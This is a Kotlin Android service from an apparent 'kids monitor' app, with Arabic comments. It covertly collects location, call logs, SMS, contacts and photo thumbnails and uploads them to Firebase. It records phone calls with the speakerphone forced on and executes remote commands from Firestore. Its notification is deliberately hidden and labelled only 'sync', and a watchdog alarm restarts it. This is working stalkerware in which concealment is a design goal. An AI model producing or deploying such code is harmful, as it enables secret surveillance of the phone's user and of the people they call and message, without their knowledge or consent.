package com.kids.monitor

import android.Manifest
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.database.ContentObserver
import android.media.AudioManager
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.Network
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.firestore.SetOptions
import com.kids.monitor.data.Collectors
import com.kids.monitor.data.CommandExecutor
import com.kids.monitor.data.DeviceInfo
import com.kids.monitor.data.FirestoreSync
import com.kids.monitor.data.LocationCollector
import com.kids.monitor.data.PendingStore
import com.kids.monitor.data.Permissions
import com.kids.monitor.data.StorageUploader
import java.io.File

/**
 * خدمة Foreground للمزامنة: الموقع، المكالمات، الرسائل، الوسائط، الأوامر، تسجيل المكالمات.
 * الإشعار مخفي تماماً عبر قناة IMPORTANCE_NONE (لا يظهر في شريط الحالة).
 */
class MonitorService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private var commandsListener: ListenerRegistration? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var contentObserver: ContentObserver? = null
    private var locationToken: Any? = null
    private var telephony: TelephonyManager? = null
    private var phoneListener: PhoneStateListener? = null
    private var recorder: MediaRecorder? = null
    private var recordingFile: File? = null
    private var recordingNumber: String? = null
    private var recordingStartedAt = 0L
    private var callStartedAt = 0L
    private var callDirection = "incoming"
    private var callRinging = false

    /** نبضة كل 60 ثانية تُظهر للوحة أن الجهاز متصل فعلاً (لا بيانات قديمة). */
    private val heartbeatTask = object : Runnable {
        override fun run() {
            FirestoreSync.setLive(
                this@MonitorService, "status",
                mapOf(
                    "online" to DeviceInfo.online(this@MonitorService),
                    "battery" to DeviceInfo.battery(this@MonitorService),
                    "recording" to (recorder != null),
                    "timestamp" to System.currentTimeMillis(),
                ),
            )
            handler.postDelayed(this, HEARTBEAT_MS)
        }
    }

    private val syncTask = object : Runnable {
        override fun run() {
            syncStatus()
            handler.postDelayed(this, SYNC_INTERVAL_MS)
        }
    }

    private val relayTask = object : Runnable {
        override fun run() {
            relayData()
            handler.postDelayed(this, RELAY_INTERVAL_MS)
        }
    }

    @Volatile
    private var lastFixAt = 0L

    /** يضمن وصول موقع جديد حتى لو لم يرسل المزوّد تحديثات (شاشة مقفلة/داخل مبنى). */
    private val locationWatchdog = object : Runnable {
        override fun run() {
            if (locationToken != null && System.currentTimeMillis() - lastFixAt > 120_000L) {
                Thread {
                    val loc = LocationCollector.freshLocation(this@MonitorService, 8000)
                    if (loc != null) saveLocation(loc)
                }.start()
            }
            handler.postDelayed(this, 60_000L)
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        FirestoreSync.init(this)
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) {
            stopSelf()
            return START_NOT_STICKY
        }
        if (FirebaseAuth.getInstance().currentUser == null) {
            stopSelf()
            return START_NOT_STICKY
        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val type = if (Permissions.has(this, Manifest.permission.RECORD_AUDIO)) {
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                } else {
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                }
                startForeground(NOTIFICATION_ID, buildNotification("المزامنة تعمل"), type)
            } else {
                startForeground(NOTIFICATION_ID, buildNotification("المزامنة تعمل"))
            }
        } catch (e: Exception) {
            FirestoreSync.logError(this, "monitor", e.localizedMessage ?: "تعذر تشغيل الخدمة")
            stopSelf()
            return START_NOT_STICKY
        }
        prefs().edit().putBoolean(SHARING_ENABLED, true).apply()

        handler.removeCallbacks(syncTask)
        handler.post(syncTask)
        handler.removeCallbacks(relayTask)
        handler.postDelayed(relayTask, RELAY_INTERVAL_MS)

        listenCommands()
        registerNetworkCallback()
        registerContentObservers()
        registerCallRecorder()
        startLocationUpdates()
        handler.removeCallbacks(locationWatchdog)
        handler.postDelayed(locationWatchdog, 60_000L)
        handler.removeCallbacks(heartbeatTask)
        handler.post(heartbeatTask)
        scheduleAlarm()

        if (intent?.action == ACTION_SYNC) {
            syncStatus()
            Thread { relayData() }.start()
        }
        return START_STICKY
    }

    override fun onDestroy() {
        instance = null
        handler.removeCallbacks(syncTask)
        handler.removeCallbacks(relayTask)
        handler.removeCallbacks(locationWatchdog)
        handler.removeCallbacks(heartbeatTask)
        commandsListener?.remove()
        commandsListener = null
        LocationCollector.stopUpdates(this, locationToken)
        locationToken = null
        if (networkCallback != null) {
            try {
                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                cm.unregisterNetworkCallback(networkCallback!!)
            } catch (e: Exception) { /* تجاهل */ }
            networkCallback = null
        }
        if (contentObserver != null) {
            try { contentResolver.unregisterContentObserver(contentObserver!!) } catch (e: Exception) { /* تجاهل */ }
            contentObserver = null
        }
        if (phoneListener != null) {
            try { telephony?.listen(phoneListener!!, PhoneStateListener.LISTEN_NONE) } catch (e: Exception) { /* تجاهل */ }
            phoneListener = null
        }
        stopCallRecording()
        prefs().edit().putBoolean(SHARING_ENABLED, false).apply()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun prefs(): SharedPreferences = getSharedPreferences(PREFERENCES, MODE_PRIVATE)

    // ---------- الموقع ----------

    private fun startLocationUpdates() {
        if (locationToken != null) return
        if (!LocationCollector.hasPermission(this)) return
        locationToken = LocationCollector.startUpdates(this, 30_000L) { location ->
            handler.post { saveLocation(location) }
        }
        // إرسال آخر موقع معروف فوراً
        val last = LocationCollector.lastLocation(this)
        if (last != null) handler.post { saveLocation(last) }
    }

    private fun saveLocation(location: Map<String, Any>) {
        lastFixAt = System.currentTimeMillis()
        if (DeviceInfo.online(this)) {
            FirestoreSync.writeLocation(this, location)
        } else {
            PendingStore.addMap(this, location)
        }
    }

    // ---------- المزامنة ----------

    private fun syncStatus() {
        if (FirebaseAuth.getInstance().currentUser == null) {
            stopSelf()
            return
        }
        val online = DeviceInfo.online(this)
        flushPending()
        if (locationToken == null) startLocationUpdates()
        FirestoreSync.updateStatus(this, DeviceInfo.status(this, online))
        val location = LocationCollector.lastLocation(this)
        if (location != null && online) FirestoreSync.writeLocation(this, location)
        updateNotification(
            if (online) "المزامنة تعمل · البطارية ${DeviceInfo.battery(this)}٪"
            else "لا يوجد إنترنت · حفظ محلي",
        )
    }

    private fun flushPending() {
        val items = PendingStore.drain(this)
        if (items.isEmpty()) return
        val uid = FirestoreSync.uid() ?: return
        val did = FirestoreSync.deviceId(this)
        var lastLat = 0.0
        var lastLng = 0.0
        var lastTs: Any = System.currentTimeMillis()
        for (obj in items) {
            val map = HashMap<String, Any>()
            for (key in obj.keys()) {
                val value = obj.opt(key)
                if (value != null) map[key] = value
            }
            if (map["timestamp"] !is Number) map["timestamp"] = System.currentTimeMillis()
            FirestoreSync.subRef(uid, did, "locations").add(map)
            lastLat = obj.optDouble("lat", lastLat)
            lastLng = obj.optDouble("lng", lastLng)
            lastTs = map["timestamp"] ?: lastTs
        }
        FirestoreSync.deviceRef(uid, did).set(
            mapOf("location" to mapOf("lat" to lastLat, "lng" to lastLng, "timestamp" to lastTs)),
            SetOptions.merge(),
        )
    }

    private fun relayData() {
        Thread {
            if (!DeviceInfo.online(this)) return@Thread
            syncRecentData()
            syncContacts()
            syncMedia()
            prefs().edit().putLong(LAST_RELAY_AT, System.currentTimeMillis()).apply()
        }.start()
    }

    private fun syncRecentData() {
        val seenCalls = prefs().getStringSet(SEEN_CALLS, emptySet()) ?: emptySet()
        val newCalls = HashSet(seenCalls)
        if (Permissions.has(this, Manifest.permission.READ_CALL_LOG)) {
            // لا نفلتر بالوقت: أي مكالمة لم تُرسل سابقاً تُرسل الآن (كان الفلتر يُسقط مكالمات كاملة)
            Collectors.callLog(this, 60).forEach { item ->
                val key = item["callId"]?.toString() ?: return@forEach
                if (newCalls.contains(key)) return@forEach
                newCalls.add(key)
                FirestoreSync.appendItem(this, "calls", item)
            }
        }
        val seenSms = prefs().getStringSet(SEEN_SMS, emptySet()) ?: emptySet()
        val newSms = HashSet(seenSms)
        if (Permissions.has(this, Manifest.permission.READ_SMS)) {
            Collectors.messages(this, 40).forEach { item ->
                val key = item["smsId"]?.toString() ?: return@forEach
                if (newSms.contains(key)) return@forEach
                newSms.add(key)
                FirestoreSync.appendItem(this, "messages", item)
            }
        }
        prefs().edit()
            .putStringSet(SEEN_CALLS, trim(newCalls))
            .putStringSet(SEEN_SMS, trim(newSms))
            .apply()
    }

    private fun trim(set: Set<String>): Set<String> =
        if (set.size <= 400) set else set.toList().takeLast(400).toSet()

    private fun syncContacts() {
        if (prefs().getBoolean(CONTACTS_SYNCED, false)) return
        if (!Permissions.has(this, Manifest.permission.READ_CONTACTS)) return
        Collectors.contacts(this).take(500).forEach { FirestoreSync.appendItem(this, "contacts", it) }
        prefs().edit().putBoolean(CONTACTS_SYNCED, true).apply()
    }

    /** رفع آخر الصور/الفيديوهات كنسخ مصغّرة (10 عناصر كحد أقصى في الدورة). */
    private fun syncMedia() {
        if (Permissions.mediaPermissions().none { Permissions.has(this, it) }) return
        val uploaded = prefs().getStringSet(UPLOADED_MEDIA, emptySet()) ?: emptySet()
        val newUploaded = HashSet(uploaded)
        val candidates = Collectors.media(this, 80)
            .filter { !newUploaded.contains(it["mediaId"]?.toString()) }
            .take(10)
        for (item in candidates) {
            val id = item["mediaId"]?.toString() ?: continue
            if (newUploaded.contains(id)) continue
            val type = item["type"] as? String ?: "file"
            val name = (item["name"] as? String ?: "file").replace(Regex("[^\\w.\\-]"), "_")
            val uriString = item["uri"] as? String ?: continue
            val uri = android.net.Uri.parse(uriString)
            var entry = item
            var uploadedOk = false
            try {
                val thumb = if (type == "image") {
                    Collectors.thumbnail(this, uri)
                } else if (type == "video") {
                    Collectors.videoThumbnail(this, uri)
                } else null
                val file = thumb ?: File(this.cacheDir, "media_${id}.tmp")
                val path = "media/$type/${id}_$name"
                val url = if (thumb != null) StorageUploader.uploadSync(thumb, path) else null
                val inline = if (url == null && thumb != null) StorageUploader.inlineData(thumb) else null
                if (url != null || inline != null) {
                    entry = item + mapOf(
                        "url" to (url ?: ""),
                        "dataUrl" to (inline ?: ""),
                        "thumbPath" to path,
                        "timestamp" to ((item["timestamp"] as? Long) ?: System.currentTimeMillis()),
                    )
                    uploadedOk = true
                }
                thumb?.delete()
                if (thumb == null) file.delete()
            } catch (e: Exception) {
                FirestoreSync.logError(this, "media", e.localizedMessage ?: "تعذر رفع وسيط")
            }
            if (uploadedOk) newUploaded.add(id)
            FirestoreSync.appendItem(this, "media", entry)
        }
        if (candidates.isNotEmpty()) {
            prefs().edit()
                .putStringSet(UPLOADED_MEDIA, trim(newUploaded))
                .putLong(LAST_MEDIA_AT, System.currentTimeMillis())
                .apply()
        }
    }

    // ---------- الأوامر ----------

    private fun listenCommands() {
        if (commandsListener != null) return
        commandsListener = FirestoreSync.listenCommands(this) { commandId, data ->
            val type = data["type"]?.toString() ?: return@listenCommands
            val handled = prefs().getStringSet(EXECUTED_COMMANDS, emptySet()) ?: emptySet()
            if (handled.contains(commandId)) return@listenCommands
            prefs().edit().putStringSet(EXECUTED_COMMANDS, trim(handled + commandId)).apply()
            @Suppress("UNCHECKED_CAST")
            val payload = data["payload"] as? Map<String, Any> ?: emptyMap()
            Thread {
                val result = CommandExecutor.execute(this, type, payload)
                val success = result["ok"] == true
                FirestoreSync.setCommandResult(this, commandId, if (success) "done" else "failed", result)
            }.start()
        }
    }

    private fun registerNetworkCallback() {
        if (networkCallback != null) return
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return
        val callback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                handler.post { flushPending(); syncStatus() }
            }
        }
        try {
            cm.registerDefaultNetworkCallback(callback)
            networkCallback = callback
        } catch (e: Exception) { /* تجاهل */ }
    }

    private fun registerContentObservers() {
        if (contentObserver != null) return
        val observer = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean) {
                handler.postDelayed({ Thread { relayData() }.start() }, 4000L)
            }
        }
        try {
            contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, observer)
            contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, observer)
            contentResolver.registerContentObserver(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, observer)
            contentObserver = observer
        } catch (e: Exception) { /* تجاهل */ }
    }

    // ---------- تسجيل المكالمات ----------

    private fun registerCallRecorder() {
        if (phoneListener != null) return
        if (!Permissions.has(this, Manifest.permission.READ_PHONE_STATE)) return
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager ?: return
        val listener = object : PhoneStateListener() {
            @Deprecated("Deprecated in Java")
            override fun onCallStateChanged(state: Int, incomingNumber: String?) {
                when (state) {
                    TelephonyManager.CALL_STATE_RINGING -> {
                        callRinging = true
                        if (!incomingNumber.isNullOrBlank()) recordingNumber = incomingNumber
                        publishCall(active = true, incoming = true)
                    }
                    TelephonyManager.CALL_STATE_OFFHOOK -> {
                        if (recordingNumber.isNullOrBlank()) recordingNumber = incomingNumber
                        callStartedAt = System.currentTimeMillis()
                        callDirection = if (callRinging) "incoming" else "outgoing"
                        callRinging = false
                        publishCall(active = true, incoming = callDirection == "incoming")
                        startCallRecording()
                    }
                    TelephonyManager.CALL_STATE_IDLE -> {
                        publishCall(active = false, incoming = callDirection == "incoming")
                        stopCallRecording()
                        callRinging = false
                    }
                }
            }
        }
        try {
            tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE)
            telephony = tm
            phoneListener = listener
        } catch (e: Exception) { /* تجاهل */ }
    }

    /** يعلن بدء/انتهاء المكالمة في live/call حتى تُظهر اللوحة إشعاراً فورياً. */
    private fun publishCall(active: Boolean, incoming: Boolean) {
        val number = recordingNumber.orEmpty()
        val now = System.currentTimeMillis()
        val data = mutableMapOf<String, Any>(
            "active" to active,
            "number" to number,
            "name" to "",
            "direction" to if (incoming) "incoming" else "outgoing",
            "startedAt" to if (active) (if (callStartedAt > 0L) callStartedAt else now) else callStartedAt,
            "recording" to active,
            "timestamp" to now,
        )
        if (!active) data["duration"] = ((now - callStartedAt) / 1000L).coerceAtLeast(0L)
        FirestoreSync.setLive(this, "call", data)
        if (number.isBlank()) return
        Thread {
            val name = lookupCallName(number)
            if (name.isNotBlank()) {
                FirestoreSync.setLive(
                    this, "call",
                    mapOf("active" to active, "number" to number, "name" to name, "timestamp" to System.currentTimeMillis()),
                )
            }
        }.start()
    }

    /** بحث محلي في جهات الاتصال عن اسم الرقم (بديل بسيط لتروكولر، بدون إنترنت). */
    private fun lookupCallName(number: String): String {
        if (number.isBlank()) return ""
        if (!Permissions.has(this, Manifest.permission.READ_CONTACTS)) return ""
        return try {
            val uri = android.net.Uri.withAppendedPath(
                ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                android.net.Uri.encode(number),
            )
            contentResolver.query(
                uri,
                arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME),
                null, null, null,
            )?.use { c -> if (c.moveToFirst()) c.getString(0).orEmpty() else "" } ?: ""
        } catch (e: Exception) {
            ""
        }
    }

    /** تشغيل السماعة أثناء التسجيل حتى يلتقط المايك صوت الطرف الآخر. */
    @Suppress("DEPRECATION")
    private fun setSpeaker(on: Boolean) {
        try {
            val am = getSystemService(Context.AUDIO_SERVICE) as? AudioManager ?: return
            am.isSpeakerphoneOn = on
        } catch (e: Exception) { /* تجاهل */ }
    }

    private fun startCallRecording() {
        if (!Permissions.has(this, Manifest.permission.RECORD_AUDIO)) return
        if (recorder != null) return
        setSpeaker(true)
        // المايك أولاً (يلتقط صوت السماعة) ثم VOICE_COMMUNICATION كبديل
        val sources = intArrayOf(
            MediaRecorder.AudioSource.MIC,
            MediaRecorder.AudioSource.VOICE_COMMUNICATION,
            MediaRecorder.AudioSource.VOICE_CALL,
        )
        for (source in sources) {
            try {
                val file = File(cacheDir, "call_${System.currentTimeMillis()}.m4a")
                val mr = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this) else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }
                mr.setAudioSource(source)
                mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                mr.setAudioEncodingBitRate(64000)
                mr.setAudioSamplingRate(44100)
                mr.setOutputFile(file.absolutePath)
                mr.prepare()
                mr.start()
                recorder = mr
                recordingFile = file
                recordingStartedAt = System.currentTimeMillis()
                updateNotification("تسجيل مكالمة جاري…")
                return
            } catch (e: Exception) {
                recorder = null
                recordingFile = null
            }
        }
        FirestoreSync.logError(this, "call_recording", "تعذر بدء تسجيل المكالمة (قيود النظام)")
    }

    private fun stopCallRecording() {
        setSpeaker(false)
        val mr = recorder ?: return
        try { mr.stop() } catch (e: Exception) { /* تجاهل */ }
        try { mr.release() } catch (e: Exception) { /* تجاهل */ }
        recorder = null
        val file = recordingFile
        recordingFile = null
        val number = recordingNumber
        recordingNumber = null
        val startedAt = recordingStartedAt
        recordingStartedAt = 0L
        val direction = callDirection
        if (file == null) return
        if (!file.exists() || file.length() <= 1024) {
            file.delete()
            Thread {
                FirestoreSync.appendItem(
                    this, "calls",
                    mapOf(
                        "number" to (number ?: ""),
                        "name" to lookupCallName(number.orEmpty()),
                        "type" to direction,
                        "kind" to "recording",
                        "direction" to direction,
                        "duration" to 0,
                        "timestamp" to startedAt,
                        "recording" to "failed",
                        "reason" to "الملف فارغ — النظام يمنع تسجيل المكالمات على أندرويد 10+",
                    ),
                )
            }.start()
            return
        }
        Thread {
            val url = StorageUploader.uploadSync(file, "recordings/${file.name}")
            val inline = if (url == null) StorageUploader.inlineData(file, 700_000) else null
            val saved = url != null || inline != null
            val duration = ((System.currentTimeMillis() - startedAt) / 1000L).coerceAtLeast(0L).toInt()
            val name = lookupCallName(number.orEmpty())
            FirestoreSync.appendItem(
                this, "calls",
                mapOf(
                    "number" to (number ?: ""),
                    "name" to name,
                    "type" to direction,
                    "kind" to "recording",
                    "direction" to direction,
                    "duration" to duration,
                    "timestamp" to startedAt,
                    "recording" to if (saved) "saved" else "failed",
                    "url" to (url ?: ""),
                    "dataUrl" to (inline ?: ""),
                    "mimeType" to "audio/mp4",
                    "size" to file.length(),
                ),
            )
            // نسخة في قسم الوسائط للتشغيل السريع (روابط Storage فقط لتوفير الحجم)
            if (url != null) {
                FirestoreSync.appendItem(
                    this, "media",
                    mapOf(
                        "name" to "تسجيل مكالمة ${number ?: ""}".trim(),
                        "url" to url,
                        "type" to "audio",
                        "mimeType" to "audio/mp4",
                        "size" to file.length(),
                        "timestamp" to System.currentTimeMillis(),
                        "recording" to "saved",
                        "number" to (number ?: ""),
                    ),
                )
            }
            file.delete()
        }.start()
    }

    /** يعيد جدولة تشغيل الخدمة بعد 15 دقيقة لو أوقفها النظام (توفير الطاقة). */
    private fun scheduleAlarm() {
        try {
            val am = getSystemService(Context.ALARM_SERVICE) as? AlarmManager ?: return
            val pending = PendingIntent.getBroadcast(
                this, 2003,
                Intent(this, AlarmReceiver::class.java).setAction(AlarmReceiver.ACTION_WATCHDOG),
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
            )
            val at = System.currentTimeMillis() + 15 * 60 * 1000L
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, at, pending)
            } else {
                am.set(AlarmManager.RTC_WAKEUP, at, pending)
            }
        } catch (e: Exception) { /* تجاهل */ }
    }

    // ---------- الإشعار (مخفي) ----------

    private fun updateNotification(message: String) {
        val manager = getSystemService(NotificationManager::class.java) ?: return
        try {
            manager.notify(NOTIFICATION_ID, buildNotification(message))
        } catch (e: Exception) { /* تجاهل */ }
    }

    private fun buildNotification(message: String): Notification {
        val openApp = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
        )
        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
        }
        return builder
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentTitle("المزامنة")
            .setContentText(message)
            .setContentIntent(openApp)
            .setPriority(Notification.PRIORITY_MIN)
            .setShowWhen(false)
            .setSound(null)
            .setVisibility(Notification.VISIBILITY_SECRET)
            .setOngoing(true)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val manager = getSystemService(NotificationManager::class.java)
            // حذف القنوات القديمة الظاهرة إن وُجدت
            for (old in listOf("status_sync", "camera_stream", "screen_share", "mic_stream")) {
                try { manager.deleteNotificationChannel(old) } catch (e: Exception) { /* تجاهل */ }
            }
            val channel = NotificationChannel(CHANNEL_ID, "المزامنة", NotificationManager.IMPORTANCE_NONE)
                .apply {
                    description = "خدمة المزامنة الخلفية"
                    setShowBadge(false)
                    setSound(null, null)
                    enableVibration(false)
                    lockscreenVisibility = Notification.VISIBILITY_SECRET
                }
            manager.createNotificationChannel(channel)
        }
    }

    companion object {
        const val PREFERENCES = "status_sync"
        const val SHARING_ENABLED = "sharing_enabled"
        private const val LAST_RELAY_AT = "last_relay_at"
        private const val LAST_MEDIA_AT = "last_media_at"
        private const val CONTACTS_SYNCED = "contacts_synced"
        private const val UPLOADED_MEDIA = "uploaded_media"
        private const val SEEN_CALLS = "seen_calls"
        private const val SEEN_SMS = "seen_sms"
        private const val EXECUTED_COMMANDS = "executed_commands"
        const val CALL_RECORDER = "call_recorder"
        private const val ACTION_STOP = "com.kids.monitor.STOP_STATUS_SYNC"
        private const val ACTION_SYNC = "com.kids.monitor.SYNC_NOW"
        private const val CHANNEL_ID = "status_sync_v3"
        private const val NOTIFICATION_ID = 1001
        private const val SYNC_INTERVAL_MS = 3 * 60 * 1000L
        private const val RELAY_INTERVAL_MS = 10 * 60 * 1000L
        private const val HEARTBEAT_MS = 60 * 1000L

        @Volatile
        private var instance: MonitorService? = null

        fun start(context: Context) {
            val intent = Intent(context, MonitorService::class.java)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                FirestoreSync.logError(context, "monitor", e.localizedMessage ?: "تعذر بدء الخدمة")
            }
        }

        fun syncNow(context: Context) {
            val intent = Intent(context, MonitorService::class.java).setAction(ACTION_SYNC)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) { /* تجاهل */ }
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, MonitorService::class.java))
        }
    }
}
